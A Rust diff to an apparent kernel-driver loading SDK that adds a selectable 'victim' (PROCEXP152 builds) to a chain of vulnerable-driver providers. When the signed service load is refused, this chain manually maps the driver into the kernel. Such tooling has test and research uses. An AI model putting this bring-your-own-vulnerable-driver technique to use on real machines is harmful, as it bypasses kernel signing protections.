@@ -157,20 +157,32 @@ fn driver_name() -> String {
     )
 }
 
-/// Maps [`DRIVER_IMAGE`] into the kernel and waits for the driver to
-/// publish its object names.
+/// Loads the driver with no explicit provider or victim: the service
+/// load runs first, then every provider × victim combination in order
+/// until one maps the driver. Equivalent to
+/// [`start_with`]`(None, None)`.
+pub fn start() -> Result<(), Error> {
+    start_with(None, None)
+}
+
+/// Loads the driver with an explicit provider and/or victim.
+///
+/// `provider` selects the vulnerable-driver provider; `Some(id)` runs
+/// that provider alone (no other provider is tried), `None` walks the
+/// whole [`provider::PROVIDERS`] table in order — the last provider
+/// that succeeded in this process first, then the rest.
+///
+/// `victim` is a PROCEXP152 build number (1627/1702/1712); `Some(v)`
+/// pins that build, `None` walks the builds newest-first for each
+/// attempt (1712 → 1702 → 1627). `KS_SDK_KDU_PRV=<id>` (the retired
+/// `KS_TEST_KDU_PRV` is still honored) is tried first in the `None`
+/// provider mode; `KS_SDK_MAP=1` skips the service load entirely
+/// (manual mapping only).
 ///
 /// Loading order: the **normal service load first** — the image is
 /// signed, and the loader path does not overwrite live kernel code.
-/// Only when the service load is rejected (signature, policy) does
-/// [`start`] fall back to manual mapping: it walks the
-/// [`provider::PROVIDERS`] table in order — the last provider that
-/// succeeded in this process first, then the rest — until one maps the
-/// driver. `KS_SDK_MAP=1` reverses the order (manual mapping only, no
-/// service attempt); `KS_SDK_KDU_PRV=<id>` (the retired
-/// `KS_TEST_KDU_PRV` is still honored) pins the provider in `None`
-/// mode. A `Some(id)` argument runs that provider alone — but only
-/// after the service load was tried first, unless `KS_SDK_MAP=1`.
+/// Only when the service load is rejected (signature, policy) does the
+/// manual-map provider chain run.
 ///
 /// The image reaches disk only on the service path
 /// (`%SystemRoot%\Temp\KernelScriptSc.sys`, removed again by [`stop`]).
@@ -196,7 +208,12 @@ fn driver_name() -> String {
 /// provider could run the map either, [`Error::NotReady`] when the load
 /// succeeded but the publication never appeared, [`Error::Setup`] for
 /// temporary directory or working-directory failures.
-pub fn start(provider: Option<u32>) -> Result<(), Error> {
+pub fn start_with(provider: Option<u32>, victim: Option<u32>) -> Result<(), Error> {
+    if let Some(build) = victim {
+        if provider::Victim::from_build(build).is_none() {
+            return Err(Error::Setup(format!("unknown victim build {build}")));
+        }
+    }
     let root = temp_root();
     if let Err(error) = std::fs::create_dir_all(&root) {
         return Err(Error::Setup(format!("create {}: {error}", root.display())));
@@ -209,7 +226,7 @@ pub fn start(provider: Option<u32>) -> Result<(), Error> {
         return Err(Error::Setup(format!("enter {}: {error}", root.display())));
     }
 
-    let outcome = run_provider_chain(provider);
+    let outcome = run_provider_chain(provider, victim);
 
     let restore = std::env::set_current_dir(&previous);
     let _ = std::fs::remove_dir_all(&root);
@@ -227,6 +244,7 @@ pub fn start(provider: Option<u32>) -> Result<(), Error> {
 /// run the map, then always unload it again (the mapped target keeps
 /// running; only the loader driver is released, exactly like
 /// `KDUProviderRelease` did).
+#[allow(clippy::too_many_arguments)]
 fn try_provider(
     def: &'static provider::ProviderDef,
     kernel_image: usize,
@@ -235,6 +253,7 @@ fn try_provider(
     memory_tag: u32,
     hvci: bool,
     build: u32,
+    victim_override: Option<provider::Victim>,
 ) -> Result<u32, String> {
     if build < def.min_build {
         return Err(format!("build {build} is older than the provider requires"));
@@ -312,6 +331,7 @@ fn try_provider(
         memory_tag,
         object_name: object_name.clone(),
         registry_name,
+        victim_override,
     });
 
     nt_close(device);
@@ -331,10 +351,10 @@ fn try_provider(
     result.map_err(|error| format!("provider {}: {error}", def.id))
 }
 
-/// The [`start`] provider chain: probe the environment once, enable the
-/// loader privileges (`KDUProviderCreate` did this before every map),
-/// then run every candidate until one payload reports a status.
-fn run_provider_chain(provider: Option<u32>) -> Result<(), Error> {
+/// The [`start_with`] provider chain: probe the environment once, enable
+/// the loader privileges (`KDUProviderCreate` did this before every
+/// map), then run every candidate until one payload reports a status.
+fn run_provider_chain(provider: Option<u32>, victim: Option<u32>) -> Result<(), Error> {
     let (hvci, build) = env::probe().map_err(Error::Setup)?;
     loader::enable_privilege(nt::SE_DEBUG_PRIVILEGE)
         .map_err(|error| Error::Setup(format!("SeDebugPrivilege: {error}")))?;
@@ -394,6 +414,7 @@ fn run_provider_chain(provider: Option<u32>) -> Result<(), Error> {
             memory_tag,
             hvci,
             build,
+            victim.and_then(provider::Victim::from_build),
         ) {
             Ok(status) => {
                 LAST_GOOD_PROVIDER.store(id, Ordering::Relaxed);
@@ -549,4 +570,15 @@ fn nt_close(handle: nt::HANDLE) {
     unsafe {
         let _ = nt::NtClose(handle);
     }
+}
+
+/// Every retained provider id, in table order (newest first-suitable
+/// for `start_with`'s provider argument and for harness iteration).
+pub fn provider_ids() -> Vec<u32> {
+    provider::PROVIDERS.iter().map(|def| def.id).collect()
+}
+
+/// Every victim build number that ships with the SDK, newest first.
+pub fn victim_builds() -> [u32; 3] {
+    [1712, 1702, 1627]
 }
